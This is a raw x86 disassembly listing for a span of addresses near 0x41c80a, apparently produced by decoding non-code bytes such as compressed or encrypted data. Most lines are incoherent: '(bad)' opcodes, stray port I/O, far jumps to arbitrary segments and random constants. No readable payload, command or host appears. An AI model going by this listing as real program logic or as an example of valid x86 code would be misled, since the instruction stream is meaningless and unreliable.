  41c80a:	scas   eax,DWORD PTR es:[edi]
  41c80b:	pop    esp
  41c80c:	xchg   edi,eax
  41c80d:	cld    
  41c80e:	clc    
  41c80f:	xor    eax,0x30930d78
  41c814:	mov    edi,0x7d790d0c
  41c819:	pop    edx
  41c81a:	cs call 0x3b80008a
  41c820:	adc    BYTE PTR [ecx-0x6],ch
  41c823:	mov    ds:0xcd1c1f99,eax
  41c828:	out    dx,eax
  41c829:	sahf   
  41c82a:	mov    al,0x87
  41c82c:	adc    edx,DWORD PTR [ebx]
  41c82e:	xchg   edi,eax
  41c82f:	push   esi
  41c831:	arpl   WORD PTR [ebx-0x251fce4e],di
  41c837:	pop    ebx
  41c838:	js     0x41c877
  41c83a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c83b:	mov    ebx,0x309f3812
  41c840:	fsubr  DWORD PTR [edx]
  41c842:	bound  esi,QWORD PTR [eax]
  41c844:	shr    DWORD PTR [ebp-0x63c31ee0],0x13
  41c84b:	inc    ebp
  41c84c:	jns    0x41c888
  41c84e:	ja     0x41c86b
  41c850:	or     DWORD PTR [edi-0x5f],esp
  41c853:	cmp    BYTE PTR [eax-0x39],al
  41c856:	aad    0xc7
  41c858:	sbb    BYTE PTR [esi],dh
  41c85a:	fs ds (bad) 
  41c85d:	test   al,0xf4
  41c85f:	clc    
  41c860:	xor    ebp,DWORD PTR [edx-0x20]
  41c863:	sub    BYTE PTR [ebp+0x23],dh
  41c866:	jo     0x41c8d7
  41c868:	xor    esi,DWORD PTR [esp+eiz*8+0x4c]
  41c86c:	or     al,BYTE PTR [eax+0x18]
  41c86f:	repnz mov esp,0xe5e952dd
  41c875:	or     eax,DWORD PTR [esi-0x30]
  41c878:	sub    DWORD PTR [ebx-0x7f51f656],ecx
  41c87e:	mov    WORD PTR [esi+0x7a04494d],?
  41c884:	fisub  WORD PTR ds:0x8bc35368
  41c88a:	add    bl,bh
  41c88c:	pop    edi
  41c88d:	icebp  
  41c88e:	gs jg  0x41c8e4
  41c891:	sub    al,0xea
  41c893:	xchg   edi,esi
  41c895:	push   ebx
  41c896:	adc    BYTE PTR [ecx+0x1c],0x8b
  41c89a:	out    0xe0,al
  41c89c:	xchg   ebp,eax
  41c89d:	out    dx,eax
  41c89e:	aaa    
  41c89f:	add    BYTE PTR [edx],dl
  41c8a1:	dec    esp
  41c8a2:	dec    edx
  41c8a3:	dec    esi
  41c8a4:	xchg   edi,eax
  41c8a5:	dec    ebp
  41c8a6:	mov    edx,0xc0f3fe5f
  41c8ab:	add    al,0xb8
  41c8ad:	add    DWORD PTR [edx],eax
  41c8af:	retf   
  41c8b0:	adc    eax,0xc4b72fc
  41c8b5:	cmp    al,0xb8
  41c8b7:	dec    esi
  41c8b8:	xor    BYTE PTR [ebx+0x4c],cl
  41c8bb:	in     eax,0x15
  41c8bd:	or     al,0x7
  41c8bf:	inc    esp
  41c8c0:	lods   al,BYTE PTR ds:[esi]
  41c8c1:	rol    DWORD PTR [eax],1
	...
  41c933:	add    bl,al
  41c935:	mov    esp,0xf87f4844
  41c93a:	iret   
  41c93b:	mov    edi,0x4f0c9749
  41c940:	ja     0x41c8ca
  41c942:	nop
  41c943:	jmp    0xf6:0x13458
  41c94a:	add    BYTE PTR [eax],al
  41c94c:	dec    eax
  41c94d:	clc    
  41c94e:	dec    ecx
  41c94f:	and    al,0x6a
  41c951:	mov    edi,0xbb7d5ccc
  41c956:	and    esi,DWORD PTR [ebx-0x202d92f0]
  41c95c:	icebp  
  41c95d:	jle    0x41c92f
  41c95f:	ja     0x41c90a
  41c961:	shl    DWORD PTR ds:0xb4f88fb2,0x71
  41c968:	xchg   ecx,eax
  41c969:	pop    ds
  41c96a:	jbe    0x41c9ba
  41c96c:	add    eax,0x14b8fd7a
  41c971:	pop    eax
  41c972:	jo     0x41c93f
  41c974:	xor    esi,ebp
  41c976:	outs   dx,BYTE PTR ds:[esi]
  41c977:	inc    ebx
  41c978:	imul   ebx
  41c97a:	pop    ds
  41c97b:	xchg   ebx,eax
  41c97c:	mov    al,0xbc
  41c97e:	mov    dh,0x81
  41c980:	add    ebx,esi
  41c982:	add    dl,BYTE PTR [eax-0x68]
  41c985:	xchg   ah,ch
  41c987:	inc    ebp
  41c988:	xchg   edi,ecx
  41c98a:	call   0x778070b0
  41c98f:	cdq    
  41c990:	pop    ebx
  41c991:	lods   eax,DWORD PTR ds:[esi]
  41c992:	push   0x2b682a3a
  41c997:	mov    ah,0xed
  41c999:	jecxz  0x41c948
  41c99b:	jae    0x41c926
  41c99d:	das    
  41c99e:	das    
  41c99f:	ret    
  41c9a0:	mov    ch,0x5f
  41c9a2:	mov    ebp,0x3f2529d5
  41c9a7:	mov    ecx,0x283d7d63
  41c9ac:	xlat   BYTE PTR ds:[ebx]
  41c9ad:	xchg   BYTE PTR [edi-0x35],bh
  41c9b0:	mov    esp,0xa5443943
  41c9b5:	xor    ebp,DWORD PTR [edx]
  41c9b7:	ja     0x41c964
  41c9b9:	mov    esp,0xe26d4539
  41c9be:	and    cl,bh
  41c9c0:	dec    ebx
  41c9c1:	rcr    DWORD PTR [edi+0xe84d042],0x5c
  41c9c8:	shl    DWORD PTR [edi],cl
  41c9ca:	jae    0x41c9f9
  41c9cc:	rol    DWORD PTR [esi+0x48],0x4e
  41c9d0:	aaa    
  41c9d1:	xchg   al,dh
  41c9d3:	jecxz  0x41ca28
  41c9d5:	and    BYTE PTR [esi+0x5e860b19],dl
  41c9db:	lock lods al,BYTE PTR ds:[esi]
  41c9dd:	push   es
  41c9de:	mov    ebx,0x2e795a18
  41c9e3:	(bad)  
  41c9e5:	jmp    0x23b987ff
  41c9ea:	(bad)  
  41c9eb:	pop    edx
  41c9ec:	pop    esi
  41c9ed:	jns    0x41ca31
  41c9ef:	mov    ebx,0xc898f8c3
  41c9f4:	mov    fs,WORD PTR [ebx-0xd1946f1]
  41c9fa:	mov    ch,0x5c
  41c9fc:	int    0x26
  41c9fe:	dec    ebx
  41c9ff:	jmp    0xdc88:0x95f4034f
  41ca06:	ficom  DWORD PTR [ebx-0x9]
  41ca09:	jne    0x41ca2d
  41ca0b:	xor    al,0x5d
  41ca0d:	pop    esi
  41ca0e:	scas   al,BYTE PTR es:[edi]
  41ca0f:	push   ebp
  41ca10:	clc    
  41ca11:	inc    ecx
  41ca12:	mov    edi,0x53cbc634
  41ca17:	cs in  al,0x7a
  41ca1a:	test   al,0x57
  41ca1c:	and    dl,bl
  41ca1e:	adc    al,0xa9
  41ca20:	sbb    ebx,DWORD PTR [eax]
  41ca22:	outs   dx,DWORD PTR ds:[esi]
  41ca23:	xchg   esi,eax
  41ca24:	mov    ecx,0x67b10c01
  41ca29:	clc    
  41ca2a:	mov    ebx,0x70ddf670
  41ca2f:	lods   eax,DWORD PTR ds:[esi]
  41ca30:	sbb    eax,0xec646b9b
  41ca35:	mov    ecx,0x7a18d3f8
  41ca3a:	mov    bh,bl
  41ca3c:	jge    0x41ca12
  41ca3e:	imul   esi,DWORD PTR [edx-0x3f],0x6e
	...
  41cab1:	add    BYTE PTR [eax],al
  41cab3:	add    BYTE PTR [edx],cl
  41cab5:	mov    eax,0xbfb7aaa5
  41caba:	(bad)  
  41cabc:	sbb    eax,0x8de2887e
  41cac1:	int    0x72
  41cac3:	xchg   ebp,eax
  41cac4:	dec    esi
  41cac5:	xor    eax,0xf60001
  41caca:	add    BYTE PTR [eax],al
  41cacc:	mov    cl,0x7d
  41cace:	icebp  
  41cacf:	push   ebp
  41cad0:	or     dl,ah
  41cad2:	xchg   edi,eax
  41cad3:	data16 das 
  41cad5:	mov    edx,edx
  41cad7:	inc    ecx
  41cad8:	mov    ecx,0x9ec10a04
  41cadd:	pop    ebx
  41cade:	mov    eax,0xe311d2ce
  41cae3:	sbb    BYTE PTR [edi-0x78],bh
  41cae6:	add    bl,ch
  41cae8:	inc    esp
  41cae9:	xchg   ebx,eax
  41caea:	call   0x95248393
  41caef:	fsubr  st,st(1)
  41caf1:	inc    esp
  41caf2:	push   ebx
  41caf3:	pop    ebp
  41caf4:	and    edx,0x6d46665c
  41cafa:	stos   DWORD PTR es:[edi],eax
  41cafb:	mov    eax,edx
  41cafd:	jle    0x41cab5
  41caff:	push   ebx
  41cb00:	xchg   ebx,eax
  41cb01:	retf   0x611b
  41cb04:	shl    BYTE PTR [edi-0x56],1
  41cb07:	(bad)  
  41cb08:	shl    edx,1
  41cb0a:	sbb    al,0xf3
  41cb0c:	fdiv   st(3),st
  41cb0e:	push   0x83fc5b7b
  41cb13:	jle    0x41cb04
  41cb15:	push   ecx
  41cb16:	pop    ss
  41cb17:	sub    ch,BYTE PTR [eax]
  41cb19:	loope  0x41cade
  41cb1b:	lds    esi,FWORD PTR [ecx+0x6e]
  41cb1e:	sub    DWORD PTR [edx+0x2cbb7fa5],esp
  41cb24:	jmp    0x41cb9f
  41cb26:	arpl   WORD PTR [edi+0xb],si
  41cb29:	adc    esp,DWORD PTR [ecx]
  41cb2b:	repz dec edi
  41cb2d:	fcom   QWORD PTR [eax+0x46cdfb0b]
  41cb33:	sbb    eax,DWORD PTR [eax]
  41cb35:	push   esi
  41cb36:	jae    0x41cb13
  41cb38:	pop    ds
  41cb39:	mov    eax,ds:0xaab45546
  41cb3e:	daa    
  41cb3f:	imul   ebx,DWORD PTR [edi+0x3791f6c0],0x70
  41cb46:	jecxz  0x41cb61
  41cb48:	xor    al,0x3f
  41cb4a:	out    0xd5,eax
  41cb4c:	lods   al,BYTE PTR ds:[esi]
  41cb4d:	or     edx,DWORD PTR [ebx-0x6d]
  41cb50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb51:	add    dh,BYTE PTR [edi+0x36]
  41cb54:	or     ebx,DWORD PTR [esi]
  41cb56:	or     DWORD PTR [ebp+0x7a7f0d78],edi
  41cb5c:	or     edi,DWORD PTR [edi]
  41cb5e:	je     0x41cb76
  41cb60:	pop    edi
  41cb61:	or     esp,DWORD PTR [esp+ebx*2]
  41cb64:	mov    edi,DWORD PTR [ebx+0x5176dd20]
  41cb6a:	js     0x41cbeb
  41cb6c:	(bad)  [esi+0x3a]
  41cb6f:	or     ebx,ebx
  41cb71:	mov    ebp,0xca43f012
  41cb76:	test   al,0x18
  41cb78:	push   edi
  41cb79:	ret    
  41cb7a:	mov    esi,0x4b5b5bc3
  41cb7f:	jle    0x41cb14
  41cb81:	adc    edi,DWORD PTR [esi-0x48]
  41cb84:	ret    
  41cb85:	add    ah,BYTE PTR [ebp-0x2d]
  41cb88:	ret    0xd716
  41cb8b:	mov    esi,0x53b49cb6
  41cb90:	cs push ebx
  41cb92:	mov    ch,0x3c
  41cb94:	fisttp WORD PTR [esi]
  41cb96:	add    DWORD PTR [esi-0x39f3eed6],eax
  41cb9c:	aam    0x28
  41cb9e:	ins    BYTE PTR es:[edi],dx
  41cb9f:	mov    eax,0x8f602da7
  41cba4:	mov    dl,0x1b
  41cba6:	(bad)  
  41cba7:	xchg   ebx,eax
  41cba8:	fild   QWORD PTR [ecx]
  41cbaa:	outs   dx,BYTE PTR ds:[esi]
  41cbab:	gs in  al,0xa4
  41cbae:	jl     0x41cb6c
  41cbb0:	jmp    0x41cbd0
  41cbb2:	sbb    eax,0xea1c2d38
  41cbb7:	ins    DWORD PTR es:[edi],dx
  41cbb8:	dec    edx
  41cbb9:	xor    BYTE PTR [ebp+0x4f80df37],bl
  41cbbf:	xor    al,ah
  41cbc1:	das    
	...
  41cc32:	add    BYTE PTR [eax],al
  41cc34:	shl    BYTE PTR [edx],cl
  41cc36:	cli    
  41cc37:	clc    
  41cc38:	cli    
  41cc39:	clc    
  41cc3a:	sar    BYTE PTR [edx],cl
  41cc3c:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc3e:	inc    eax
  41cc3f:	aam    0xc9
  41cc41:	xor    eax,0x364434bf
  41cc46:	add    DWORD PTR [eax],eax
  41cc48:	test   BYTE PTR [eax],0x0
  41cc4b:	add    bl,bl
  41cc4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc4e:	inc    ebp
  41cc4f:	out    0xdb,eax
  41cc51:	mov    bl,0x32
  41cc53:	xor    dl,BYTE PTR [ebx+0x4d]
  41cc56:	punpckhbw mm6,mm4
  41cc59:	stos   BYTE PTR es:[edi],al
  41cc5a:	lock nop
  41cc5c:	xchg   ecx,eax
  41cc5d:	sub    eax,0xdbc5a320
  41cc62:	fsubr  QWORD PTR [ebp*8-0x496b759a]
  41cc69:	les    di,DWORD PTR [ecx+ebp*1-0x1c07d901]
  41cc71:	or     BYTE PTR [ebx-0xdca9064],dl
  41cc77:	in     al,dx
  41cc78:	adc    ch,BYTE PTR [bp+si]
  41cc7b:	mov    dh,0x1e
  41cc7d:	mov    esp,0xd5e5c064
  41cc82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc83:	shr    ah,0x5a
  41cc86:	jmp    0x41ccb7
  41cc88:	mov    edi,0x5cab622a
  41cc8d:	xor    al,0xf0
  41cc8f:	xchg   ebp,eax
  41cc90:	(bad)  
  41cc91:	in     eax,0x32
  41cc93:	imul   DWORD PTR [ecx-0x1e]
  41cc96:	stos   DWORD PTR es:[edi],eax
  41cc97:	adc    al,0xbd
  41cc99:	loop   0x41cc72
  41cc9b:	icebp  
  41cc9c:	aad    0xc6
  41cc9e:	pmaddwd mm2,mm3
  41cca1:	fisttp DWORD PTR [edx-0x25]
  41cca4:	jo     0x41cc40
  41cca6:	mov    dh,0xc8
  41cca8:	xor    BYTE PTR [edi-0x5c],ch
  41ccab:	and    eax,0xa096f706
  41ccb0:	dec    esp
  41ccb1:	mov    ch,0xd0
  41ccb3:	hlt    
  41ccb4:	ss jbe 0x41cc4d
  41ccb7:	int    0xc0
  41ccb9:	popf   
  41ccba:	mov    ds:0xacb27b9d,eax
  41ccbf:	jmp    0xdf18dd53
  41ccc4:	xchg   eax,ebx
  41ccc6:	inc    eax
  41ccc7:	js     0x41cd2c
  41ccc9:	in     al,dx
  41ccca:	push   ecx
  41cccb:	add    BYTE PTR [esi-0x754c8e77],bh
  41ccd1:	scas   eax,DWORD PTR es:[edi]
  41ccd2:	shl    DWORD PTR ds:0x96fbd9f9,0x78
  41ccd9:	adc    BYTE PTR [esp+ecx*2-0x40e65911],bh
  41cce0:	dec    esp
  41cce1:	scas   eax,DWORD PTR es:[edi]
  41cce2:	add    ch,ch
  41cce4:	push   eax
  41cce5:	sub    BYTE PTR [ebx],dh
  41cce7:	ins    BYTE PTR es:[edi],dx
  41cce8:	retf   
  41cce9:	jle    0x41cd1a
  41cceb:	retf   
  41ccec:	out    0xd4,al
  41ccee:	sub    dl,BYTE PTR [edx+0x60fc4f7b]
  41ccf4:	sar    cl,cl
  41ccf6:	mov    ebx,0xa46aa36b
  41ccfb:	mov    al,0xb2
  41ccfd:	test   DWORD PTR [eax],0x4711067e
  41cd03:	mov    ds,WORD PTR [ecx+0x3414bbcb]
  41cd09:	xor    al,bl
  41cd0b:	loop   0x41cca0
  41cd0d:	ror    ebp,cl
  41cd0f:	test   al,0x8c
  41cd11:	mov    ah,0x1e
  41cd13:	dec    ebx
  41cd14:	loope  0x41cc99
  41cd16:	inc    edx
  41cd17:	lds    edi,FWORD PTR [ecx-0x27]
  41cd1a:	out    0xcc,al
  41cd1c:	dec    esi
  41cd1d:	adc    ecx,ebp
  41cd1f:	mov    ebp,0xbd820b47
  41cd24:	xchg   edx,eax
  41cd25:	neg    DWORD PTR [edi+0x2c]
  41cd28:	sub    ah,bl
  41cd2a:	seto   ah
  41cd2d:	add    BYTE PTR [ecx-0x2f6800c3],ah
  41cd33:	hlt    
  41cd34:	es imul esp
  41cd37:	xor    dl,bl
  41cd39:	dec    ecx
  41cd3a:	icebp  
  41cd3b:	adc    al,0x19
  41cd3d:	daa    
  41cd3e:	sub    esp,DWORD PTR [edx+0x9704]
	...
  41cdb4:	test   DWORD PTR [ebp+0x7b9c6a9c],ecx
  41cdba:	imul   edi
  41cdbc:	push   ebp
  41cdbd:	call   0x8229:0x8dc9b1bb
  41cdc4:	cmp    dh,BYTE PTR [edi]
  41cdc6:	add    DWORD PTR [eax],eax
  41cdc8:	test   BYTE PTR [eax],0x0
  41cdcb:	add    BYTE PTR [edx+0x1493fd2e],ah
  41cdd1:	dec    ecx
  41cdd2:	mov    ecx,0xd22bc8a3
  41cdd7:	ja     0x41ce52
  41cdd9:	pop    ds
  41cdda:	dec    esi
  41cddb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cddc:	dec    esi
  41cddd:	mov    al,0xaa
  41cddf:	shl    BYTE PTR [ebp+0x74],0xc0
  41cde3:	sub    ecx,DWORD PTR ss:[ecx]
  41cde6:	(bad)  
  41cde7:	gs sbb edi,edi
  41cdea:	scas   al,BYTE PTR es:[edi]
  41cdeb:	pop    ss
  41cdec:	xchg   BYTE PTR [ecx],bh
  41cdee:	and    cl,cl
  41cdf0:	mov    dh,0xd3
  41cdf2:	fs aaa 
  41cdf4:	adc    al,0xad
  41cdf6:	push   ds
  41cdf7:	sub    DWORD PTR [eax+0x2a1021a8],ebp
  41cdfd:	rol    BYTE PTR [ebx+0x23ed73f7],1
  41ce03:	std    
  41ce04:	les    edi,FWORD PTR [ecx+0x57540867]
  41ce0a:	mov    esp,0x7f69feed
  41ce10:	pop    ebx
  41ce11:	mov    edx,DWORD PTR [edx+0x78]
  41ce14:	ss pop ss
  41ce16:	repz fbld TBYTE PTR [esi-0x74]
  41ce1a:	xor    BYTE PTR ds:0x9c30e804,cl
  41ce20:	hlt    
  41ce21:	aam    0x21
  41ce23:	sbb    DWORD PTR [ebx+0xdc5884],edi
  41ce29:	cmp    esi,edx
  41ce2b:	mov    ch,0xd5
  41ce2d:	dec    BYTE PTR [edx+0x1936af8f]
  41ce33:	mov    dh,0xc6
  41ce35:	or     esp,DWORD PTR [esi+esi*8+0x361f9ccf]
  41ce3c:	mov    WORD PTR [edi+ebp*8],es
  41ce3f:	inc    ebx
  41ce40:	call   0xc69f:0x24ebe5a
  41ce47:	inc    esp
  41ce48:	int    0x2d
  41ce4a:	call   0x6423:0x5320cfc1
  41ce51:	or     al,0xcd
  41ce53:	adc    esp,DWORD PTR [ebx-0x25]
  41ce56:	jno    0x41ce9d
  41ce58:	je     0x41ce61
  41ce5a:	push   ds
  41ce5b:	push   ds
  41ce5c:	or     dl,BYTE PTR [edx-0x55]
  41ce5f:	mov    dl,0x61
  41ce61:	(bad)  
  41ce62:	pop    ebp
  41ce63:	add    BYTE PTR [edx],dl
  41ce65:	icebp  
  41ce66:	test   eax,0xbd11f335
  41ce6b:	test   eax,0x2915d87e
  41ce70:	push   esp
  41ce71:	mov    ah,0x1b
  41ce73:	xor    eax,edi
  41ce75:	sti    
  41ce76:	cmp    dl,ch
  41ce78:	cmc    
  41ce79:	pushf  
  41ce7a:	fistp  QWORD PTR [ebp-0x6d3a076b]
  41ce80:	sbb    al,0x43
  41ce82:	mov    cl,BYTE PTR [ebx-0x3f0d0a9b]
  41ce88:	ror    DWORD PTR [ebp+ebx*1+0x64],1
  41ce8c:	sub    BYTE PTR [eax],dh
  41ce8e:	push   0x6
  41ce90:	jmp    0x41cefa
  41ce92:	xchg   cl,ah
  41ce94:	cs sti 
  41ce96:	into   
  41ce97:	mov    edi,0x5669dff3
  41ce9c:	cmp    DWORD PTR [edi],ebx
  41ce9e:	or     al,0xb4
  41cea0:	dec    ebp
  41cea1:	pop    ds
  41cea2:	inc    ebx
  41cea3:	ss in  al,dx
  41cea5:	retf   0xeb9d
  41cea8:	popf   
  41cea9:	jp     0x41cef5
  41ceab:	mov    al,0x3a
  41cead:	sar    DWORD PTR ss:0x71f2348c,0x5c
  41ceb5:	mov    ah,0xe3
  41ceb7:	or     DWORD PTR [ebx-0x51],esi
  41ceba:	test   DWORD PTR [edx+0x5e],edi
  41cebd:	adc    ebp,DWORD PTR [ecx+eiz*8]
  41cec0:	push   esp
  41cec1:	mov    eax,DWORD PTR [eax]
	...
  41cf33:	add    BYTE PTR [ebx+esi*2+0x33],ah
  41cf37:	es aaa 
  41cf39:	data16 jne 0x41cfaf
  41cf3c:	cmc    
  41cf3d:	jle    0x41cf41
  41cf3f:	dec    esi
  41cf40:	or     DWORD PTR [esi+0x3830f41a],eax
  41cf46:	add    DWORD PTR [eax],eax
  41cf48:	test   BYTE PTR [eax],0x0
  41cf4b:	add    BYTE PTR [eax],dl
  41cf4d:	pop    esi
  41cf4e:	test   eax,0x25550cf0
  41cf53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf54:	es div al
  41cf57:	sub    al,0x53
  41cf59:	fsub   QWORD PTR fs:[ebx-0x68514223]
  41cf60:	and    DWORD PTR [edi+ebp*4-0x1d4cbae9],0x2bdcdee8
  41cf6b:	retf   0x660f
  41cf6e:	sbb    esp,esp
  41cf70:	outs   dx,DWORD PTR ds:[esi]
  41cf71:	(bad)  
  41cf73:	inc    eax
  41cf74:	cmp    bh,0x81
  41cf77:	jno    0x41cf88
  41cf79:	push   esp
  41cf7a:	lods   eax,DWORD PTR ds:[esi]
  41cf7b:	sbb    DWORD PTR [ebx],ebx
  41cf7d:	pushf  
  41cf7e:	mov    ecx,0x60794b6e
  41cf83:	mov    esi,es
  41cf85:	xor    eax,0x8fc81c0e
  41cf8a:	repnz xchg ebx,eax
  41cf8c:	add    DWORD PTR [ecx-0x6ba29417],ebp
  41cf92:	pop    esi
  41cf93:	aad    0x87
  41cf95:	and    BYTE PTR [ebx-0x6da9d899],cl
  41cf9b:	loopne 0x41cf21
  41cf9d:	mov    bh,0xf3
  41cf9f:	mov    al,ds:0xe3ff3f42
  41cfa4:	nop
  41cfa5:	cwde   
  41cfa6:	std    
  41cfa7:	adc    edi,edx
  41cfa9:	jp     0x41cfbb
  41cfab:	sbb    DWORD PTR [esp+ecx*2-0x10],ebx
  41cfaf:	jge    0x41cf53
  41cfb1:	jg     0x41d021
  41cfb3:	setp   BYTE PTR [eax]
  41cfb6:	mov    edi,0xb26674fe
  41cfbc:	call   0x241b:0x3ed241c2
  41cfc3:	pusha  
  41cfc4:	ds int 0xe4
  41cfc7:	and    dh,al
  41cfc9:	in     eax,0xd4
  41cfcb:	ja     0x41cf61
  41cfcd:	and    eax,0xd1fbf44a
  41cfd2:	arpl   WORD PTR [eax],sp
  41cfd4:	or     bl,BYTE PTR [esi+0xa]
  41cfd7:	push   ebx
  41cfd8:	pop    ebx
  41cfd9:	and    BYTE PTR [ecx],0xb4
  41cfdc:	and    DWORD PTR [esi-0x61],0x25
  41cfe0:	push   ebp
  41cfe1:	shl    DWORD PTR [ecx+0x33],1
  41cfe4:	sub    bh,dh
  41cfe6:	ds inc esi
  41cfe8:	xlat   BYTE PTR ds:[ebx]
  41cfe9:	pop    es
  41cfea:	jns    0x41cfb8
  41cfec:	std    
  41cfed:	xchg   ecx,eax
  41cfee:	mov    ds:0xc7f9ea14,eax
  41cff3:	mov    esi,0xe34c1a33
  41cff8:	scas   eax,DWORD PTR es:[edi]
  41cff9:	inc    edx
  41cffa:	scas   al,BYTE PTR es:[edi]
  41cffb:	lea    ebp,[edx-0x4621dddf]
  41d001:	sbb    eax,0x19c4207e
  41d006:	adc    bh,BYTE PTR [eax+ecx*1-0x4c3bc165]
  41d00d:	inc    ecx
  41d00e:	add    BYTE PTR [eax],0x1f
  41d011:	mov    eax,ds:0xbd44f2d8
  41d016:	nop
  41d017:	or     ah,BYTE PTR [ebx-0x6b]
  41d01a:	stc    
  41d01b:	rcr    esp,cl
  41d01d:	mov    ch,0xba
  41d01f:	icebp  
  41d020:	mov    esp,DWORD PTR [edx]
  41d022:	fidivr DWORD PTR [di]
  41d025:	lahf   
  41d026:	mov    ds:0xbd2f64f,eax
  41d02b:	fidiv  DWORD PTR [eax+0x1a41ccdf]
  41d031:	lock mov WORD PTR [esi+ebp*2+0x6],gs
  41d036:	call   0xf4b7:0x14e512e1
  41d03d:	sbb    al,0xc4
  41d03f:	jmp    0x41cfce
  41d041:	cmp    eax,0x0
	...
  41d0b2:	add    BYTE PTR [eax],al
  41d0b4:	(bad)  [edx-0x5f]
  41d0b7:	clc    
  41d0b8:	mov    bl,0xfb
  41d0ba:	fldcw  WORD PTR [ebx-0x56]
  41d0bd:	cwde   
  41d0be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d0bf:	and    BYTE PTR [eax-0x29],0x80
  41d0c3:	dec    eax
  41d0c4:	cmp    DWORD PTR es:[ecx],eax
  41d0c7:	add    dh,dh
  41d0c9:	add    BYTE PTR [eax],al
  41d0cb:	add    BYTE PTR [ecx+0x37a55cd1],al
  41d0d1:	jmp    0x9bf7:0xd6eeb4a1
  41d0d8:	xchg   ebp,eax
  41d0d9:	fistp  QWORD PTR [ecx-0x66a37943]
  41d0df:	xor    bh,cl
  41d0e1:	push   ss
  41d0e2:	push   es
  41d0e3:	jecxz  0x41d0e9
  41d0e5:	ds push ds
  41d0e7:	push   0x5a289cde
  41d0ec:	xor    al,0xc1
  41d0ee:	test   al,0xb3
  41d0f0:	sub    ebx,esp
  41d0f2:	lods   eax,DWORD PTR ds:[esi]
  41d0f3:	ret    0x94d7
  41d0f6:	mov    ds:0xa33b16f1,eax
  41d0fb:	mov    eax,ds:0x74561ea1
  41d100:	jo     0x41d171
  41d102:	jmp    0x41d164
  41d104:	retf   
  41d105:	shl    esp,cl
  41d107:	cmp    edx,DWORD PTR [ecx-0xb903d0d]
  41d10d:	mov    gs,WORD PTR [edx+0x259ed19c]
  41d113:	arpl   WORD PTR [edi+0x17],ax
  41d116:	sbb    eax,DWORD PTR [ebx+0xc090950]
  41d11c:	and    ebp,esp
  41d11e:	jno    0x41d12c
  41d120:	push   es
  41d121:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d122:	repnz stos BYTE PTR es:[edi],al
  41d124:	gs or  eax,0xcb6dd7dc
  41d12a:	jmp    0xbb2721dc
  41d12f:	sub    eax,0x3391090f
  41d134:	shl    DWORD PTR [ebx+edx*8-0x37deeea],1
  41d13b:	and    DWORD PTR [edi-0x10],eax
  41d13e:	dec    ebp
  41d13f:	(bad)  
  41d140:	sbb    ebp,DWORD PTR [edi+0x65]
  41d143:	lods   al,BYTE PTR ds:[esi]
  41d144:	es stos BYTE PTR es:[edi],al
  41d146:	retf   0x300f
  41d149:	popf   
  41d14a:	int    0x20
  41d14c:	mov    ebp,0x524ec155
  41d151:	xchg   DWORD PTR [ecx],ebp
  41d153:	les    esp,FWORD PTR [eax+0x3f]
  41d156:	push   eax
  41d157:	jge    0x41d112
  41d159:	pop    edi
  41d15a:	xchg   edx,eax
  41d15b:	bound  edx,QWORD PTR [edi]
  41d15d:	xor    al,0x9e
  41d15f:	clc    
  41d160:	pop    ecx
  41d161:	push   ebp
  41d162:	pop    ss
  41d163:	xor    eax,DWORD PTR [eax-0x1fb9bbfb]
  41d169:	xchg   edi,eax
  41d16a:	(bad)  
  41d16b:	push   0xfa79b117
  41d170:	arpl   ax,cx
  41d172:	xchg   BYTE PTR [esi],ch
  41d174:	xor    DWORD PTR [edi-0x3e52f616],edi
  41d17a:	in     eax,0x3e
  41d17c:	jg     0x41d106
  41d17e:	sub    BYTE PTR [ebx-0x55],bh
  41d181:	jmp    0x56ad6cb
  41d186:	dec    ebx
  41d187:	mov    WORD PTR [eax],?
  41d189:	lock inc edi
  41d18b:	mov    WORD PTR [ebx+0x1bf80b8b],cs
  41d191:	adc    eax,0x804f693c
  41d196:	(bad)  
  41d197:	in     eax,0x73
  41d199:	jo     0x41d1b3
  41d19b:	adc    eax,DWORD PTR [edx]
  41d19d:	out    0x50,al
  41d19f:	mov    WORD PTR [edx+edi*2+0x47],cs
  41d1a3:	(bad)  
  41d1a4:	mov    eax,DWORD PTR [edx*4-0x1a57d669]
  41d1ab:	sub    eax,0x397fc32d
  41d1b0:	in     eax,dx
  41d1b1:	xor    al,0xf4
  41d1b3:	scas   eax,DWORD PTR es:[edi]
  41d1b4:	and    BYTE PTR [edx+0x1f],0xb3
  41d1b8:	push   edx
  41d1b9:	inc    esi
  41d1ba:	int    0x3c
  41d1bc:	imul   edi,edx,0x9878308d
	...
  41d232:	add    BYTE PTR [eax],al
  41d234:	repz and ebp,ecx
  41d237:	push   ebp
  41d238:	(bad)  
  41d23a:	sti    
  41d23b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d23c:	pop    edi
  41d23d:	push   edx
  41d23e:	jo     0x41d1ff
  41d240:	add    BYTE PTR [edx+ecx*4-0x20],bl
  41d244:	sbb    al,0x3a
  41d246:	add    DWORD PTR [eax],eax
  41d248:	test   BYTE PTR [eax],0x0
  41d24b:	add    BYTE PTR [ebx-0x754f7cb1],ch
  41d251:	jl     0x41d20e
  41d253:	xchg   esp,eax
  41d254:	inc    ebp
  41d255:	dec    esi
  41d256:	dec    edx
  41d257:	xchg   bh,ch
  41d259:	jg     0x41d2c5
  41d25b:	mov    ch,0xd8
  41d25d:	xor    edi,DWORD PTR [ebp+ebp*2+0x42433f7b]
  41d264:	mov    ch,0x94
  41d266:	out    0x4b,al
  41d268:	pop    es
  41d269:	outs   dx,BYTE PTR ds:[esi]
  41d26a:	push   0x2c201e04
  41d26f:	sub    eax,0xce67f010
  41d274:	sbb    eax,DWORD PTR [ecx]
  41d276:	add    eax,0x73db9a18
  41d27b:	pop    ecx
  41d27c:	outs   dx,BYTE PTR ds:[esi]
  41d27d:	dec    edx
  41d27e:	sub    al,0x9c
  41d280:	in     eax,dx
  41d281:	ss dec ebp
  41d283:	jmp    0xda559378
  41d288:	mov    cl,0xf1
  41d28a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
